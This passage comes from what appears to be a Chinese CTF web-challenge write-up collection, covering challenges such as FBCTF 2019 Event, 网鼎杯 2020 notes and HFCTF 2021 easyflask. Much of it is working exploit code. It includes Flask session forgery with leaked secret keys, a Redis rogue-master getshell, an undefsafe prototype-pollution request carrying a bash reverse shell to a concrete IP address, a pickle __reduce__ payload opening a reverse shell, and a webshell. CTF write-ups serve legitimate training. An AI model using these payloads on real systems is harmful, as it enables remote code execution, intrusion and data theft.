operator">+</span><span class="token string">"register.php"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>register<span class="token punctuation">)</span>    <span class="token keyword">if</span> r1<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">429</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        r2<span class="token operator">=</span>r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"login.php"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>login<span class="token punctuation">)</span>        <span class="token keyword">if</span> r2<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">429</span><span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            r3<span class="token operator">=</span>r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"index.php"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> r3<span class="token punctuation">.</span>status_code <span class="token operator">==</span><span class="token number">429</span><span class="token punctuation">:</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                r3 <span class="token operator">=</span> r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"index.php"</span><span class="token punctuation">)</span>                fund<span class="token punctuation">(</span>r3<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                fund<span class="token punctuation">(</span>r3<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="CSAWQual-2016-i-got-id"   >          <a href="#CSAWQual-2016-i-got-id" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2>      <p>看代码，对上传文件的处理</p><pre class="line-numbers language-none"><code class="language-none">if ($cgi-&gt;upload(&#39;file&#39;)) &#123;    my $file &#x3D; $cgi-&gt;param(&#39;file&#39;);    while (&lt;$file&gt;) &#123;        print &quot;$_&quot;;        print &quot;&lt;br &#x2F;&gt;&quot;;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>其中<code>my $file= $cgi-&gt;param( &#39;file&#39; );</code>中的<code>param()</code>函数返回一个列表的文件。但是只有第一个文件会被放入file变量中。</p><p>while ( &lt;$file&gt; )中，&lt;&gt;不能处理字符串，除非是ARGV，因此循环遍历并将每个值使用open()<br>调用。</p><p>对于读文件，如果传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。<br>所以，在上传的正常文件前加上一个文件上传项ARGV，然后在URL中传入文件路径参数，就可以读取任意文件。</p></blockquote><p>ARGV就是命令行参数</p>        <h2 id="FBCTF2019-Event"   >          <a href="#FBCTF2019-Event" class="heading-link"><i class="fas fa-link"></i></a><a href="#FBCTF2019-Event" class="headerlink" title="[FBCTF2019]Event"></a>[FBCTF2019]Event</h2>      <p>看参数在event_important处有SSTI，再看cookie中有session，肯定是伪造没跑了，先捞出私钥<code>__class__.__init__.__globals__[app].config</code>，<code> &#39;SECRET_KEY&#39;: &#39;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&#39;</code>，然后脚本伪造就行了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> SecureCookieSessionInterfaceapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">b'fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y'</span>session_serializer <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>session_serializer<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>index<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="网鼎杯-2020-玄武组-SSRFMe"   >          <a href="#网鼎杯-2020-玄武组-SSRFMe" class="heading-link"><i class="fas fa-link"></i></a><a href="#网鼎杯-2020-玄武组-SSRFMe" class="headerlink" title="[网鼎杯 2020 玄武组]SSRFMe"></a>[网鼎杯 2020 玄武组]SSRFMe</h2>      <p>先使用0.0.0.0拿到hint，<code>redispass is root</code>，说明目标应该是开启了redis服务并且密码是root，此处利用的是Redis主从复制来getshell</p><blockquote>        <h3 id="Redis主从复制"   >          <a href="#Redis主从复制" class="heading-link"><i class="fas fa-link"></i></a><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h3>      <p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p></blockquote><p>所以我们这题的思路是，创建一个恶意的Redis服务器作为Redis主机（master），该Redis主机能够回应其他连接他的Redis从机的响应。有了恶意的Redis主机之后，就会远程连接目标Redis服务器，通过 slaveof 命令将目标Redis服务器设置为我们恶意Redis的Redis从机（slaver）。然后将恶意Redis主机上的exp同步到Reids从机上，并将dbfilename设置为exp.so。最后再控制Redis从机（slaver）加载模块执行系统命令即可。<br>首先需要这两个项目</p><p><span class="exturl"><a class="exturl__link"   href="https://github.com/n0b0dyCN/redis-rogue-server" >恶意so</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link"   href="https://github.com/xmsec/redis-ssrf" >伪造主机</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>将恶意so项目中的exp.so文件放到伪造主机项目的目录中，伪造主机项目中更改ssrf那个python文件来生成payload，然后使用server文件来开启伪装服务器，传入执行即可</p>        <h2 id="网鼎杯-2020-青龙组-notes"   >          <a href="#网鼎杯-2020-青龙组-notes" class="heading-link"><i class="fas fa-link"></i></a><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h2>      <p>给源码了，直接看重点</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> undefsafe <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'undefsafe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">edit_note</span><span class="token punctuation">(</span><span class="token parameter">id<span class="token punctuation">,</span> author<span class="token punctuation">,</span> raw</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">undefsafe</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">,</span> id <span class="token operator">+</span> <span class="token string">'.author'</span><span class="token punctuation">,</span> author<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">undefsafe</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">,</span> id <span class="token operator">+</span> <span class="token string">'.raw_note'</span><span class="token punctuation">,</span> raw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/edit_note'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">"please use POST to edit a note"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> id <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>id<span class="token punctuation">;</span>        <span class="token keyword">let</span> author <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>author<span class="token punctuation">;</span>        <span class="token keyword">let</span> enote <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>raw<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">&amp;&amp;</span> author <span class="token operator">&amp;&amp;</span> enote<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            notes<span class="token punctuation">.</span><span class="token function">edit_note</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> author<span class="token punctuation">,</span> enote<span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">"edit note sucess"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">"edit note failed"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/status'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> commands <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string-property property">"script-1"</span><span class="token operator">:</span> <span class="token string">"uptime"</span><span class="token punctuation">,</span>            <span class="token string-property property">"script-2"</span><span class="token operator">:</span> <span class="token string">"free -m"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> index <span class="token keyword">in</span> commands<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">shell</span><span class="token operator">:</span><span class="token string">'/bin/bash'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">stdout: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>stdout<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'OK'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用了undefsafe模块，该模块在版本小于2.0.3的时候存在原型链污染漏洞</p><p><img src="https://img-blog.csdnimg.cn/70ea2b9eee5c499f9bc3aa29c3ac94f7.png"></p><p>问题就出在对不存在的属性进行赋值的时候，传入<code>__proto__</code>就会导致原型链污染，看代码中<code>undefsafe(this.note_list, id + &#39;.author&#39;, author);</code>其中id和auther我们都可控，在author处放入我们想要执行的命令，id处构造<code>__proto__</code>即可完成原型链污染，导致信息传入命令执行</p><pre class="line-numbers language-none"><code class="language-none">id&#x3D;__proto__&amp;author&#x3D;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F43.249.193.167%2F38901%200%3E%261&amp;raw&#x3D;kkk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="羊城杯-2020-Easyphp2"   >          <a href="#羊城杯-2020-Easyphp2" class="heading-link"><i class="fas fa-link"></i></a><a href="#羊城杯-2020-Easyphp2" class="headerlink" title="[羊城杯 2020]Easyphp2"></a>[羊城杯 2020]Easyphp2</h2>      <p>进去先用双URL编码绕过waf读源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'max_execution_time'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PASS'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'PASS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;h2>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;hacker>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;h2>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;h1>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'404'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;h1>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'Sorry, only people from GWHT are allowed to access this website.'</span><span class="token operator">.</span><span class="token string single-quoted-string">'23333'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"count"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"count"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/;|base64|rot13|base32|base16|&lt;\?php|#/i'</span><span class="token punctuation">,</span> <span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2>The Count is: "</span> <span class="token operator">.</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'printf \''</span> <span class="token operator">.</span> <span class="token variable">$count</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'\' | wc -c'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/h2>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>读robots，发现check.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"GWHT"</span><span class="token punctuation">;</span><span class="token comment">// Cookie password.</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Here is nothing, isn't it ?"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更改cookie中的pass，出了个文本框，内容传入count被执行，写个shell进去，然后蚁剑连接，找到flag.txt发现没有读取权限，看README解出密码<code>GWHTCTF</code>，使用su命令切换用户，读取flag</p><pre class="line-numbers language-none"><code class="language-none">shell&#x3D;system(&quot;printf &#39;GWHTCTF&#39; | su  -c &#39;cat &#x2F;GWHT&#x2F;system&#x2F;of&#x2F;a&#x2F;down&#x2F;flag.txt&#39; GWHT&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="HFCTF-2021-Final-easyflask"   >          <a href="#HFCTF-2021-Final-easyflask" class="heading-link"><i class="fas fa-link"></i></a><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h2>      <p>读文件，读源码，读下环境找到<code>secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh</code>，看session，明显一个pickle，伪造上传就行了</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python3.6import osimport picklefrom base64 import b64decodefrom flask import Flask, request, render_template, sessionapp &#x3D; Flask(__name__)app.config[&quot;SECRET_KEY&quot;] &#x3D; &quot;*******&quot;User &#x3D; type(&#39;User&#39;, (object,), &#123;    &#39;uname&#39;: &#39;test&#39;,    &#39;is_admin&#39;: 0,    &#39;__repr__&#39;: lambda o: o.uname,&#125;)@app.route(&#39;&#x2F;&#39;, methods&#x3D;(&#39;GET&#39;,))def index_handler():    if not session.get(&#39;u&#39;):        u &#x3D; pickle.dumps(User())        session[&#39;u&#39;] &#x3D; u    return &quot;&#x2F;file?file&#x3D;index.js&quot;@app.route(&#39;&#x2F;file&#39;, methods&#x3D;(&#39;GET&#39;,))def file_handler():    path &#x3D; request.args.get(&#39;file&#39;)    path &#x3D; os.path.join(&#39;static&#39;, path)    if not os.path.exists(path) or os.path.isdir(path) \            or &#39;.py&#39; in path or &#39;.sh&#39; in path or &#39;..&#39; in path or &quot;flag&quot; in path:        return &#39;disallowed&#39;    with open(path, &#39;r&#39;) as fp:        content &#x3D; fp.read()    return content@app.route(&#39;&#x2F;admin&#39;, methods&#x3D;(&#39;GET&#39;,))def admin_handler():    try:        u &#x3D; session.get(&#39;u&#39;)        if isinstance(u, dict):            u &#x3D; b64decode(u.get(&#39;b&#39;))        u &#x3D; pickle.loads(u)    except Exception:        return &#39;uhh?&#39;    if u.is_admin &#x3D;&#x3D; 1:        return &#39;welcome, admin&#39;    else:        return &#39;who are you?&#39;if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(&#39;0.0.0.0&#39;, port&#x3D;80, debug&#x3D;False)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token keyword">import</span> osUser <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token string">'uname'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span>    <span class="token string">'is_admin'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token string">'__repr__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> o<span class="token punctuation">.</span>uname<span class="token punctuation">,</span>    <span class="token string">'__reduce__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/ip/port 0>&amp;1'"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>User<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="HITCON-2016-Leaking"   >          <a href="#HITCON-2016-Leaking" class="heading-link"><i class="fas fa-link"></i></a><a href="#HITCON-2016-Leaking" class="headerlink" title="[HITCON 2016]Leaking"></a>[HITCON 2016]Leaking</h2>      <p>这是一道关于node.js沙箱逃逸的问题<br>大致说一下 题目的描述，首先定义变量flag，然后我们可以在沙箱里面执行任意的命令，那我们如何逃逸出去呢？</p><blockquote><p>在较早一点的 node 版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。 </p></blockquote><p>该题环境是8.0前，我们直接使用Buffer读取内存内容即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://39115099-9d08-4235-a5d8-300bf6b9ad57.node4.buuoj.cn:81/?data=Buffer(500)'</span>response <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token string">'flag'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        response <span class="token operator">=</span> req<span class="token punctuation">.</span>text        <span class="token keyword">print</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag&#123;'</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="NPUCTF2020-验证🐎"   >          <a href="#NPUCTF2020-验证🐎" class="heading-link"><i class="fas fa-link"></i></a><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2>      <p>给了源码，就不放了，直接看关键，首先是一个md5绕过，利用js弱类型相加、</p><pre class="line-numbers language-none"><code class="language-none">[1]+&#39;1&#39; &#x2F;&#x2F;&#39;11&#39;&#39;1&#39;+&#39;1&#39; &#x2F;&#x2F;&#39;11&#39;[1]!&#x3D;&#x3D;&#39;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">if (first &amp;&amp; second &amp;&amp; first.length &#x3D;&#x3D;&#x3D; second.length &amp;&amp; first!&#x3D;&#x3D;second &amp;&amp; md5(first+keys[0]) &#x3D;&#x3D;&#x3D; md5(second+keys[0]))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就是传入的内容</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">saferEval</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| </span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">eval</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里正则会发现可用函数只有Math，此处使用尖头函数加原型来执行</p><pre class="line-numbers language-none"><code class="language-none">function (x) &#123;    return x * x;&#125;该函数使用箭头函数可以使用仅仅一行代码搞定！x &#x3D;&gt; x * x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处取Math原型可得到Function</p><pre class="line-numbers language-none"><code class="language-none">Math.constructor.constructor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>又因为不能直接传入命令执行，使用String中的String.fromCharCode()来将数字转换成字符串，再利用js中弱类型相加构造出字符串类，构造出如下payload</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token parameter">Math</span><span class="token 